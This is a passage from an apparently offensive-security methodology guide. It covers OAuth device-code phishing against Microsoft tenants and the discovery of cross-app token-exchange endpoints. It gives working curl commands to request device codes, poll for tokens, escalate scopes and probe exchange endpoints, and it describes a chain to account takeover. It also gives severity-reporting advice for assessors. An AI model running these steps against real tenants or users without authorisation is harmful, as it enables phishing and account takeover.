...
1. **Enumerate all OAuth entry points**
   ...
   - For Keycloak deployments with an app-local auth proxy, use `references/keycloak-auth-proxy-and-master-realm.md` to distinguish proxy-controlled state/PKCE from direct Keycloak client behavior and to triage public `master` realm exposure.
...
### OIDC discovery → Device Code Flow phishing surface

After pulling `.well-known/openid-configuration`, check whether the
`device_authorization_endpoint` is present and accepts the target app's
`client_id`. If so, an attacker can initiate a device-code flow and social-
engineer a tenant user into visiting `https://login.microsoft.com/device`
and entering the `user_code` — the attacker polls the token endpoint and
receives tokens.

```bash
# 1. Pull OIDC metadata, note tenant_id + client_id from SSO config endpoint
curl -sk https://login.microsoftonline.com/<TENANT>/v2.0/.well-known/openid-configuration | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('device_authorization_endpoint'))"

# 2. Request a device code for the app
curl -sk -X POST 'https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/devicecode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'client_id=<CLIENT_ID>&scope=openid%20profile%20email%20offline_access%20User.Read'

# 3. Poll the token endpoint (expect authorization_pending until user approves)
curl -sk -X POST 'https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'client_id=<CLIENT_ID>&grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=<DEVICE_CODE>'
```

**Scope enumeration:** the device-code endpoint reveals which scopes the app
registration permits. Test progressively sensitive scopes:
`openid profile email offline_access` → `User.Read` → `api://<client_id>/.default`
→ `https://graph.microsoft.com/User.Read`. Each accepted scope widens the
phishing impact (Graph access, app-specific access, refresh tokens).

**Severity discipline:** device-code flow enabled is **not** a no-click auth
bypass. It is a phishing surface whose impact depends on:
1. Conditional Access policies (compliant device / MFA / location requirements)
2. Whether the issued token's audience matches the target app's backend
3. Whether the backend has a token-exchange endpoint that accepts external
bearer tokens (see cross-app token exchange below)

Report as Medium unless you can prove the chain end-to-end (user approval →
attacker receives usable token → backend accepts it).

### Cross-app token exchange (SSO bridge) discovery

When a target has multiple sibling apps (e.g. admin panel + chatbot) sharing
an IdP, look for a **token exchange endpoint** on one app that accepts a
bearer token issued by the other app's OAuth/OIDC flow and issues a local
session/token. This is the bridge that turns device-code phishing into ATO.

```bash
# Probe for exchange endpoints (FastAPI/Gin pattern)
for ep in /api/v1/auth/user/external/exchange /api/auth/exchange /api/token/exchange \
          /auth/user/external/exchange /api/v1/auth/exchange; do
  curl -sk -X POST "https://$TARGET$ep" \
    -H 'Authorization: Bearer <valid_or_fake_token>' \
    -H 'Content-Type: application/json' -H 'Accept: application/json' | head -c 200
  echo
done
```

The JS bundle typically reveals the endpoint name and the expected token
type. Grep for `external/exchange`, `token_exchange`, `auth/user/external`:

```bash
grep -rohE '/auth/[a-z/]*exchange[a-z/]*' js/*.js | sort -u
```

**Chain:** Device-code phishing → obtain external bearer token → POST to
token-exchange endpoint → receive local session/token → access target app
data. Needs valid user approval to prove end-to-end.
